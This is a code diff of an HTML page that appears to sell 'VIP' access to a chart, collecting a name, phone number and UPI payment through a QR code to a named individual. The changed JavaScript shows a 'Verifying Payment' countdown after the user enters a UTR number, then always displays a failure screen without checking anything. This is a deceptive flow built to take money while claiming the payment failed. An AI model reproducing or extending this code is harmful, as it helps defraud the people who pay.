@@ -22,7 +22,7 @@
         
         .scroll-btn { background: #65bbf5; color: var(--dark-blue); padding: 10px 20px; border: 4px solid #fff; border-radius: 15px; cursor: pointer; margin: 10px; font-size: 14px; font-weight: 700; display: inline-block; }
 
-        /* Chart */
+        /* Chart Area */
         #chartArea { background: #fff; width: 98%; margin: 10px auto; border: 1px solid var(--grid-border); }
         .chart-grid { display: grid; grid-template-columns: 50px repeat(6, 1fr); width: 100%; background: #fff; }
         .day-label, .date-label { background: #000; color: var(--yellow-accent); font-weight: bold; font-size: 10px; padding: 10px 0; border: 0.5px solid var(--grid-border); }
@@ -35,7 +35,7 @@
         .single-vip-lock { color: #f70031; font-size: 22px; animation: blink 1.5s infinite; }
         @keyframes blink { 50% { opacity: 0.4; } }
 
-        /* Modal & Steps */
+        /* Modal Styles */
         .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; overflow-y: auto; }
         .modal-content { background: #fff; width: 90%; max-width: 400px; padding: 20px; border-radius: 20px; color: #333; margin: 20px 0; }
         
@@ -46,7 +46,8 @@
         .plan-item h4 { margin: 0; color: var(--dark-blue); font-size: 16px; }
         .plan-item p { margin: 5px 0 0; color: #666; font-size: 13px; line-height: 1.4; }
 
-        #timer { font-size: 24px; font-weight: bold; color: var(--red); margin: 10px 0; }
+        #timerBox { display: none; margin: 15px 0; }
+        #timerText { font-size: 26px; font-weight: bold; color: var(--red); }
         .qr-img { width: 180px; height: 180px; margin: 10px auto; border: 4px solid var(--yellow-accent); }
         .verify-btn { background: #28a745; color: #fff; padding: 12px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 90%; margin-top: 10px; }
         
@@ -113,11 +114,16 @@
 
         <div id="stepPay" style="display:none;">
             <h3 id="payTitle"></h3>
-            <div id="timer">02:00</div>
             <p style="margin:2px; font-size:14px;"><strong>Pay to: Omkar Yadav</strong></p>
             <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8103982813@ptsbi%26pn=Omkar%20Yadav%26cu=INR" class="qr-img">
+            
+            <div id="timerBox">
+                <p style="margin:0; font-size:12px; color:red;">Verifying Payment... Please Wait</p>
+                <div id="timerText">02:00</div>
+            </div>
+
             <input type="number" id="utrInput" placeholder="Enter 12 Digit UTR No.">
-            <button class="verify-btn" onclick="startVerification()">VERIFY PAYMENT</button>
+            <button class="verify-btn" id="verifyBtn" onclick="handleVerify()">VERIFY PAYMENT</button>
         </div>
 
         <div id="stepFailed" style="display:none;">
@@ -142,13 +148,16 @@
         document.getElementById('stepPlans').style.display = 'none';
         document.getElementById('stepPay').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'none';
+        document.getElementById('timerBox').style.display = 'none';
+        document.getElementById('verifyBtn').disabled = false;
+        document.getElementById('verifyBtn').innerText = "VERIFY PAYMENT";
         clearInterval(timerId);
     }
 
     function goToPlans() {
         let n = document.getElementById('userName').value;
         let p = document.getElementById('userPhone').value;
-        if(!n || p.length < 10) { alert("कृपया नाम और सही मोबाइल नंबर भरें।"); return; }
+        if(!n || p.length < 10) { alert("कृपया नाम और मोबाइल नंबर भरें।"); return; }
         document.getElementById('stepInfo').style.display = 'none';
         document.getElementById('stepPlans').style.display = 'block';
     }
@@ -157,34 +166,41 @@
         document.getElementById('stepPlans').style.display = 'none';
         document.getElementById('stepPay').style.display = 'block';
         document.getElementById('payTitle').innerText = plan + " - ₹" + amt;
+    }
+
+    function handleVerify() {
+        let utr = document.getElementById('utrInput').value;
+        if(utr.length < 10) { alert("कृपया 12 अंकों का सही UTR नंबर डालें।"); return; }
+        
+        // Hide button and input to focus on timer
+        document.getElementById('verifyBtn').disabled = true;
+        document.getElementById('verifyBtn').innerText = "Checking...";
+        document.getElementById('timerBox').style.display = 'block';
+        
         startTimer();
     }
 
     function startTimer() {
         timeLeft = 120;
+        clearInterval(timerId);
         timerId = setInterval(() => {
             timeLeft--;
             let mins = Math.floor(timeLeft / 60);
             let secs = timeLeft % 60;
-            document.getElementById('timer').innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-            if (timeLeft <= 0) { clearInterval(timerId); showFailed(); }
+            document.getElementById('timerText').innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            if (timeLeft <= 0) { 
+                clearInterval(timerId); 
+                showFailed(); 
+            }
         }, 1000);
-    }
-
-    function startVerification() {
-        let utr = document.getElementById('utrInput').value;
-        if(utr.length < 10) { alert("सही UTR नंबर दर्ज करें।"); return; }
-        document.querySelector('.verify-btn').innerText = "Processing...";
-        setTimeout(showFailed, 3000);
     }
 
     function showFailed() {
         document.getElementById('stepPay').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'block';
-        clearInterval(timerId);
     }
 
-    // Chart Logic
+    // Chart Loading
     const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
     async function loadChart() {
         try {
